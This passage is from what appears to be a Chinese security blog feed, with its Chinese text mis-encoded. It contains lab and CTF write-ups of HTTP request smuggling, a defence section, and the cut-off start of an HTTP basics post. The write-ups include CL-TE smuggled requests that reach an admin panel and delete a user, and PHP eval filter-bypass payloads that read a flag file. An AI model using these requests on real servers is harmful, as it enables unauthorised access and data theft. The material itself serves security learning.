bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>60<br>POST /admin HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>å…è®¸æœ¬åœ°æŸ¥çœ‹<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190544-763227.png" alt="1"><br>ä¸¤æ¬¡å‘å‡ºä»¥ä¸‹è¯·æ±‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Type: application/x-www-form-urlencoded<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>71<br>POST /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸè®¿é—®ç®¡ç†å‘˜é¡µé¢<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190552-248001.png" alt="2"><br>æ›´æ”¹èµ°ç§çš„è¯·æ±‚URLä»¥åˆ é™¤ç”¨æˆ·carlosï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>87<br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>è®¿é—®ç®¡ç†å‘˜é¡µé¢éªŒè¯æ˜¯å¦åˆ é™¤</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190623-841809.png" alt="3"></p><h2 id="CTFä¸­çš„è¯·æ±‚èµ°ç§"><a href="#CTFä¸­çš„è¯·æ±‚èµ°ç§" class="headerlink" title="CTFä¸­çš„è¯·æ±‚èµ°ç§"></a>CTFä¸­çš„è¯·æ±‚èµ°ç§</h2><p><strong>HGAME2021-å®è—èµ°ç§è€…</strong></p><p>hint: æ³¨æ„ç•™æ„æœåŠ¡å™¨ä¿¡æ¯<br>èµ„æ–™ï¼š<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a><br>å®è—èµ°ç§è€… Switch å–œæ¬¢å·ç›—å¹¶å°†å¥‡ç‰¹çš„å®è—èµ°ç§åˆ°ä¸€äº›é»‘å¸‚å•†å®¶æ‰‹ä¸­ã€‚<br>ä¸ºäº†é˜»æ­¢å…¶ç»§ç»­ä½œæ¶ï¼Œè­¦æ¢ Liki å¥‰å‘½å°† Switch æŠ“æ•å½’æ¡ˆã€‚<br>è°ƒæŸ¥è¿‡ç¨‹ä¸­ï¼ŒLiki å‘ç° Switch å°†ä¸€ä¸ªç§˜å¯†è—åœ¨äº†ä¸€ä¸ªç§äººæœåŠ¡å™¨ä¸­ã€‚<br>è¿™æˆ–è®¸ä¼šæˆä¸ºåç»­è¿½æŸ¥ Switch çš„é‡å¤§çº¿ç´¢ï¼Œä½ èƒ½æ‰¾åˆ°è¿™ä¸ªç§˜å¯†å—ï¼Ÿ<br><img src="https://img-blog.csdnimg.cn/20210206224207823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç‚¹å‡»è¶…é“¾æ¥è·³è½¬åˆ°/secretï¼Œå‘ç°å“åº”åŒ…ä¸­æç¤ºéœ€è¦<code>client-ip</code>å¤´</p><p><img src="https://img-blog.csdnimg.cn/20210206224349121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å°†client-ipæ”¹ä¸º127.0.0.1ï¼Œå‘ç°è¿˜æ˜¯ä¸è¡Œï¼ŒçŒœæµ‹æ˜¯åä»£ä¼šå°†çœŸå®ipå¸¦åˆ°åé¢ï¼ŒæŠ“åŒ…çœ‹åˆ°æœåŠ¡å™¨æ˜¯ATS/7.1.2ï¼Œåä»£æœåŠ¡å™¨æœ¬ç‰ˆå­˜åœ¨HTTP Smuggling CL-TE æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§</p><p>æ„é€ è¯·æ±‚åŒ…ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>73<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br>0<br><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/secret</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰èµ›åå¤ç°æ²¡æœ‰ç¯å¢ƒï¼Œè´´ä¸€å¼ å…¶ä»–å¤§å¸ˆå‚…çš„wp</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202105/02/225619-18140.png" alt="image-20210502225618544"></p><p><strong>[RoarCTF 2019]Easy Calc</strong><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190649-214946.png" alt="é¢˜ç›®"><br>calc.phpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨phpifoé¡µé¢ä¸­å‘ç°ç¦ç”¨äº†ä¸€äº›å‡½æ•°å’Œå­—ç¬¦ï¼Œæ‰€ä»¥å°è¯•ç»•è¿‡ï¼Œå¯ä»¥åˆ©ç”¨è¯·æ±‚èµ°ç§ã€‚</p><p>åˆ©ç”¨CL-CLæ¼æ´ï¼Œè¿”å›400é”™è¯¯,åŒæ—¶å¯ä»¥çœ‹åˆ°phpinfoé¡µé¢<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191236-584099.png" alt="CL-CL-phpinfo"><br><code>getcwd()</code>:è·å–åˆ°å½“å‰å·¥ä½œç›®å½•/var/www/html<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191456-261196.png" alt="getcwd"><br><code>var_dump(scandir(dirname(__FILE__)))</code>ï¼šè·å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191607-151742.png" alt="dir"><br><code>print_r(scandir(chr(47)))</code>ï¼šæ‰«ææ ¹ç›®å½•<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191701-2570.png" alt="ls"><br><code>var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>ï¼šè¯»å–flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191814-959740.png" alt="flag"><br>åŒæ ·åˆ©ç”¨CL-TEæ¼æ´åŒæ ·å¯ä»¥è¯»å–flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/192008-795497.png" alt="cl-te"></p><h2 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h2><p>åœ¨å‰ç«¯æœåŠ¡å™¨é€šè¿‡åŒä¸€ç½‘ç»œè¿æ¥å°†å¤šä¸ªè¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼Œä¼šå‡ºç°HTTPè¯·æ±‚èµ°ç§æ¼æ´ï¼Œå¹¶ä¸”åç«¯è¿æ¥æ‰€ä½¿ç”¨çš„åè®®ä¼šå¸¦æ¥ä¸¤ä¸ªæœåŠ¡å™¨ä¸åŒæ„è¾¹ç•Œçš„é£é™©ã€‚è¦æ±‚ã€‚é˜²æ­¢HTTPè¯·æ±‚èµ°ç§æ¼æ´çš„ä¸€äº›é€šç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><ul><li>ç¦ç”¨åç«¯è¿æ¥çš„é‡ç”¨ï¼Œä»¥ä¾¿æ¯ä¸ªåç«¯è¯·æ±‚é€šè¿‡å•ç‹¬çš„ç½‘ç»œè¿æ¥å‘é€ã€‚</li><li>ä½¿ç”¨HTTP / 2è¿›è¡Œåç«¯è¿æ¥ï¼Œå› ä¸ºæ­¤åè®®å¯é˜²æ­¢å¯¹è¯·æ±‚ä¹‹é—´çš„è¾¹ç•Œäº§ç”Ÿæ­§ä¹‰ã€‚</li><li>å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä½¿ç”¨å®Œå…¨ç›¸åŒçš„WebæœåŠ¡å™¨è½¯ä»¶ï¼Œä»¥ä¾¿å®ƒä»¬å°±è¯·æ±‚ä¹‹é—´çš„ç•Œé™è¾¾æˆä¸€è‡´ã€‚</li></ul><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä½¿å‰ç«¯æœåŠ¡å™¨è§„èŒƒæ­§ä¹‰è¯·æ±‚æˆ–ä½¿åç«¯æœåŠ¡å™¨æ‹’ç»æ­§ä¹‰è¯·æ±‚å¹¶å…³é—­ç½‘ç»œè¿æ¥æ¥é¿å…æ¼æ´ã€‚ä½†æ˜¯ï¼Œè¿™äº›æ–¹æ³•æ¯”ä¸Šé¢ç¡®å®šçš„é€šç”¨ç¼“è§£æªæ–½æ›´å®¹æ˜“å‡ºé”™ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a><br><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a><br><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPåè®®</title>
    <link href="/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šæ·±å…¥å­¦ä¹ HTTPåè®®</p> <a id="more"></a><h1 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h1><h2 id="HTTPåè®®ç®€ä»‹"><a href="#HTTPåè®®ç®€ä»‹" class="headerlink" title="HTTPåè®®ç®€ä»‹"></a>HTTPåè®®ç®€ä»‹</h2><p>è¶…æ–‡æœ¬ä¼ è¾“åè®® (HTTP-Hypertext transfer protocol) æ˜¯ä¸€ç§è¯¦ç»†è§„å®šäº†æµè§ˆå™¨å’Œä¸‡ç»´ç½‘æœåŠ¡å™¨ä¹‹é—´äº’ç›¸é€šä¿¡çš„è§„åˆ™ï¼Œé€šè¿‡å› ç‰¹ç½‘ä¼ é€ä¸‡ç»´ç½‘æ–‡æ¡£çš„æ•°æ®ä¼ é€åè®®ã€‚é€šå¸¸ï¼Œç”±HTTPå®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œå»ºç«‹ä¸€ä¸ªåˆ°æœåŠ¡å™¨æŒ‡å®šç«¯å£ï¼ˆé»˜è®¤æ˜¯80ç«¯å£ï¼‰çš„TCPè¿æ¥ã€‚HTTPæœåŠ¡å™¨åˆ™åœ¨é‚£ä¸ªç«¯å£ç›‘å¬å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚ã€‚ä¸€æ—¦æ”¶åˆ°è¯·æ±‚ï¼ŒæœåŠ¡å™¨ï¼ˆå‘å®¢æˆ·ç«¯ï¼‰å‘å›ä¸€ä¸ªçŠ¶æ€è¡Œï¼Œæ¯”å¦‚â€HTTP/1.1 200 OKâ€ï¼Œå’Œï¼ˆå“åº”çš„ï¼‰æ¶ˆæ¯ï¼Œæ¶ˆæ¯çš„æ¶ˆæ¯ä½“å¯èƒ½æ˜¯è¯·æ±‚çš„æ–‡ä»¶ã€é”™è¯¯æ¶ˆæ¯ã€æˆ–è€…å…¶å®ƒä¸€äº›ä¿¡æ¯ã€‚HTTPä½¿ç”¨TCPè€Œä¸æ˜¯UDPçš„åŸå› åœ¨äºï¼ˆæ‰“å¼€ä¸€ä¸ªï¼‰ä¸€ä¸ªç½‘é¡µå¿…é¡»ä¼ é€å¾ˆå¤šæ•°æ®ï¼Œè€ŒTCPåè®®æä¾›ä¼ è¾“æ§åˆ¶ï¼ŒæŒ‰é¡ºåºç»„ç»‡æ•°æ®ï¼Œå’Œé”™è¯¯çº æ­£ã€‚</p><p>ä»å±‚æ¬¡çš„è§’åº¦çœ‹ï¼ŒHTTPæ˜¯é¢å‘äº‹åŠ¡çš„(transaction-oriented)åº”ç”¨å±‚åè®®ï¼Œå®ƒæ˜¯ä¸‡ç»´ç½‘ä¸Šèƒ½å¤Ÿå¯é åœ°äº¤æ¢æ–‡ä»¶(åŒ…æ‹¬æ–‡æœ¬ã€å£°éŸ³ã€å›¾åƒç­‰å„ç§å¤šåª’ä½“æ–‡ä»¶)çš„é‡è¦åŸºç¡€ã€‚</p><p>äº¤äº’è¿‡ç¨‹å¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210329204302530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>httpåè®®æ€ç»´å¯¼å›¾<br><img src="https://img-blog.csdnimg.cn/20210409104101378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="HTTPåè®®ç‰¹ç‚¹"><a href="#HTTPåè®®ç‰¹ç‚¹" class="headerlink" title="HTTPåè®®ç‰¹ç‚¹"></a>HTTPåè®®ç‰¹ç‚¹</h2><p>1.åŸºäºè¯·æ±‚/å“åº”æ¨¡å‹çš„åè®®ã€‚</p><ul><li>è¯·æ±‚å’Œå“åº”å¿…é¡»æˆå¯¹ï¼Œå…ˆæœ‰è¯·æ±‚åæœ‰å“åº”</li></ul><p>2.ç®€å•å¿«é€Ÿ</p><ul><li>å®¢æˆ·å‘æœåŠ¡å™¨è¯·æ±‚æœåŠ¡æ—¶ï¼Œåªéœ€ä¼ é€è¯·æ±‚æ–¹æ³•å’Œè·¯å¾„ã€‚è¯·æ±‚æ–¹æ³•å¸¸ç”¨çš„æœ‰GETã€HEADã€POSTã€‚æ¯ç§æ–¹æ³•è§„å®šäº†å®¢æˆ·ä¸æœåŠ¡å™¨è”ç³»çš„ç±»å‹ä¸åŒã€‚ç”±äºHTTPåè®®ç®€å•ï¼Œä½¿å¾—HTTPæœåŠ¡å™¨çš„ç¨‹åºè§„æ¨¡å°ï¼Œå› è€Œé€šä¿¡é€Ÿåº¦å¾ˆå¿«ã€‚</li></ul><p>3.çµæ´»</p><ul><li>HTTPå…è®¸ä¼ è¾“ä»»æ„ç±»å‹çš„æ•°æ®å¯¹è±¡ã€‚æ­£åœ¨ä¼ è¾“çš„ç±»å‹ç”±Content-TypeåŠ ä»¥æ ‡è®°ã€‚</li></ul><p>4.æ— è¿æ¥</p><ul><li>æ¯æ¬¡è¯·æ±‚ä¸€æ¬¡ï¼Œé‡Šæ”¾ä¸€æ¬¡è¿æ¥ã€‚æ‰€ä»¥æ— è¿æ¥è¡¨ç¤ºæ¯æ¬¡è¿æ¥åªèƒ½å¤„ç†ä¸€ä¸ªè¯·æ±‚ã€‚æœåŠ¡å™¨å¤„ç†å®Œå®¢æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ”¶åˆ°å®¢æˆ·çš„åº”ç­”åï¼Œå³æ–­å¼€è¿æ¥ã€‚é‡‡ç”¨è¿™ç§æ–¹å¼å¯ä»¥èŠ‚çœä¼ è¾“æ—¶é—´ã€‚</li></ul><p>5.æ— çŠ¶æ€</p><ul><li>HTTPåè®®æ˜¯æ— çŠ¶æ€åè®®ã€‚æ— çŠ¶æ€æ˜¯æŒ‡åè®®å¯¹äºäº‹åŠ¡å¤„ç†æ²¡æœ‰è®°å¿†èƒ½åŠ›ã€‚ç¼ºå°‘çŠ¶æ€æ„å‘³ç€å¦‚æœåç»­å¤„ç†éœ€è¦å‰é¢çš„ä¿¡æ¯ï¼Œåˆ™å®ƒå¿…é¡»é‡ä¼ ï¼Œè¿™æ ·å¯èƒ½å¯¼è‡´æ¯æ¬¡è¿æ¥ä¼ é€çš„æ•°æ®é‡å¢å¤§ã€‚å¦ä¸€æ–¹é¢ï¼Œåœ¨æœåŠ¡å™¨ä¸éœ€è¦å…ˆå‰ä¿¡æ¯æ—¶å®ƒçš„åº”ç­”å°±è¾ƒå¿«ã€‚</li></ul><h2 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h2><p>HTTPæ˜¯åŸºäºå®¢æˆ·/æœåŠ¡å™¨æ¨¡å¼ï¼Œä¸”é¢å‘è¿æ¥çš„ã€‚å…¸å‹çš„HTTPäº‹åŠ¡å¤„ç†æœ‰å¦‚ä¸‹çš„è¿‡ç¨‹åˆ†ä¸ºå››æ­¥ï¼š<br>ï¼ˆ1ï¼‰å®¢æˆ·ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥<br>ã€€ã€€é¦–å…ˆå®¢æˆ·æœºä¸æœåŠ¡å™¨éœ€è¦å»ºç«‹è¿æ¥ã€‚åªè¦å•å‡»æŸä¸ªè¶…çº§é“¾æ¥ï¼ŒHTTPçš„å·¥ä½œå°±å¼€å§‹äº†ã€‚<br>ï¼ˆ2ï¼‰å®¢æˆ·å‘æœåŠ¡å™¨æå‡ºè¯·æ±‚<br>ã€€ã€€å»ºç«‹è¿æ¥åï¼Œå®¢æˆ·æœºå‘é€ä¸€ä¸ªè¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œè¯·æ±‚æ–¹å¼çš„æ ¼å¼ä¸ºï¼šç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼ˆURLï¼‰ã€åè®®ç‰ˆæœ¬å·ï¼Œåè¾¹æ˜¯MIMEä¿¡æ¯åŒ…æ‹¬è¯·æ±‚ä¿®é¥°ç¬¦ã€å®¢æˆ·æœºä¿¡æ¯å’Œå¯èƒ½çš„å†…å®¹ã€‚<br>ï¼ˆ3ï¼‰æœåŠ¡å™¨æ¥å—è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚è¿”å›ç›¸åº”çš„æ–‡ä»¶ä½œä¸ºåº”ç­”<br>ã€€ã€€æœåŠ¡å™¨æ¥åˆ°è¯·æ±‚åï¼Œç»™äºˆç›¸åº”çš„å“åº”ä¿¡æ¯ï¼Œå…¶æ ¼å¼ä¸ºä¸€ä¸ªçŠ¶æ€è¡Œï¼ŒåŒ…æ‹¬ä¿¡æ¯çš„åè®®ç‰ˆæœ¬å·ã€ä¸€ä¸ªæˆåŠŸæˆ–é”™è¯¯çš„ä»£ç ï¼Œåè¾¹æ˜¯MIMEä¿¡æ¯åŒ…æ‹¬æœåŠ¡å™¨ä¿¡æ¯ã€å®ä½“ä¿¡æ¯å’Œå¯èƒ½çš„å†…å®¹ã€‚<br>ï¼ˆ4ï¼‰å®¢æˆ·ä¸æœåŠ¡å™¨å…³é—­è¿æ¥<br>ã€€ã€€ å®¢æˆ·ç«¯æ¥æ”¶æœåŠ¡å™¨æ‰€è¿”å›çš„ä¿¡æ¯é€šè¿‡æµè§ˆå™¨æ˜¾ç¤ºåœ¨ç”¨æˆ·çš„æ˜¾ç¤ºå±ä¸Šï¼Œç„¶åå®¢æˆ·æœºä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥ã€‚</p><p>ã€€ã€€å¦‚æœåœ¨ä»¥ä¸Šè¿‡ç¨‹ä¸­çš„æŸä¸€æ­¥å‡ºç°é”™è¯¯ï¼Œé‚£ä¹ˆäº§ç”Ÿé”™è¯¯çš„ä¿¡æ¯å°†è¿”å›åˆ°å®¢æˆ·ç«¯ã€‚ã€€ã€€</p><h2 id="HTTPåè®®å‘å±•å²"><a href="#HTTPåè®®å‘å±•å²" class="headerlink" title="HTTPåè®®å‘å±•å²"></a>HTTPåè®®å‘å±•å²</h2><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>0.9ç‰ˆæœ¬æ˜¯ç¬¬ä¸€ä¸ªå®šç¨¿çš„HTTPç‰ˆæœ¬ï¼Œç›¸å¯¹è¾ƒä¸ºç®€é™‹ã€‚å®ƒæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li><p>åªæ¥å— GET ä¸€ç§è¯·æ±‚æ–¹æ³•</p></li><li><p>æ²¡æœ‰headerç­‰æè¿°æ•°æ®çš„ä¿¡æ¯</p></li><li><p>æœåŠ¡å™¨å‘é€å®Œæ¯•ï¼Œå°±å…³é—­TCPè¿æ¥</p></li></ul><p>ç”±äºè¯¥ç‰ˆæœ¬ä¸æ”¯æŒ POST æ–¹æ³•ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯æ— æ³•å‘æœåŠ¡å™¨ä¼ é€’å¤ªå¤šä¿¡æ¯</p><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><p>1.0ç‰ˆæœ¬åœ¨0.9ç‰ˆæœ¬ä¸Šåšå‡ºäº†å¾ˆå¤šåˆ›æ–°å’Œä¼˜åŒ–ï¼Œè¯¥ç‰ˆæœ¬ï¼š</p><ul><li><p>å¢åŠ äº†æ–°çš„å‘½ä»¤ï¼ˆPOSTå‘½ä»¤å’ŒHEADERå‘½ä»¤ï¼‰</p></li><li><p>å¢åŠ status codeï¼ˆçŠ¶æ€ç ï¼‰å’Œheader</p></li><li><p>å¢åŠ å¤šå­—ç¬¦é›†æ”¯æŒã€å¤šéƒ¨åˆ†å‘é€ã€authorizationï¼ˆæƒé™ï¼‰ã€cacheï¼ˆç¼“å­˜ï¼‰ç­‰</p></li></ul><p>è¿™æ˜¯ç¬¬ä¸€ä¸ªåœ¨é€šè®¯ä¸­æŒ‡å®šç‰ˆæœ¬å·çš„HTTP åè®®ç‰ˆæœ¬ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬ï¼ŒåŸºæœ¬å®ç°äº†HTTPåè®®çš„æ¡†æ¶ã€‚</p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>1.1ç‰ˆæœ¬è§£å†³äº†å¤§é‡1.0ç‰ˆæœ¬çš„ç—›ç‚¹ï¼Œè¯¥ç‰ˆæœ¬æ–°å¢äº†ä»¥ä¸‹åŠŸèƒ½ï¼š</p><ul><li><p>æŒä¹…è¿æ¥ï¼ˆkeep aliveï¼‰</p></li><li><p>ç®¡é“åŒ–ï¼ˆpipelineï¼‰</p></li><li><p>hostå’Œå…¶ä»–ä¸€äº›å‘½ä»¤</p></li></ul><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><p>HTTP2.0çš„å‰èº«æ˜¯HTTP1.0å’ŒHTTP1.1,æ˜¯HTTP åè®®çš„ç¬¬äºŒä¸ªä¸»è¦ç‰ˆæœ¬ï¼Œè¯¥ç‰ˆæœ¬å…³æ³¨äºå‡å°‘å»¶è¿Ÿæ—¶é—´ï¼Œä»è€Œæé«˜é¡µé¢åŠ è½½é€Ÿåº¦ã€‚HTTP/2 æ˜¯åŸºäº SPDY åè®®çš„ï¼Œæ‰“å¼€ä¸€ä¸ª TCP è¿æ¥å¹¶é‡å¤ä½¿ç”¨ï¼Œè¿™ä½¿å¾—è®¸å¤šè¯·æ±‚å¾—ä»¥å¹¶è¡Œå‘é€ï¼Œè€Œæ— éœ€ç­‰å¾…å“åº”ã€‚</p><p>HTTP/2.0ä¼˜åŠ¿æ˜¯:</p><ul><li><p>æ‰€æœ‰æ•°æ®äºŒè¿›åˆ¶ä¼ è¾“</p></li><li><p>åŒä¸€é“¾æ¥å¤šä¸ªè¯·æ±‚ä¸å†æŒ‰ç…§é¡ºåºæ¥</p></li><li><p>å¤´ä¿¡æ¯å‹ç¼©ä»¥åŠæ¨é€ç­‰æé«˜æ•ˆç‡çš„åŠŸèƒ½</p></li></ul><h1 id="HTTPæŠ¥æ–‡æ ¼å¼"><a href="#HTTPæŠ¥æ–‡æ ¼å¼" class="headerlink" title="HTTPæŠ¥æ–‡æ ¼å¼"></a>HTTPæŠ¥æ–‡æ 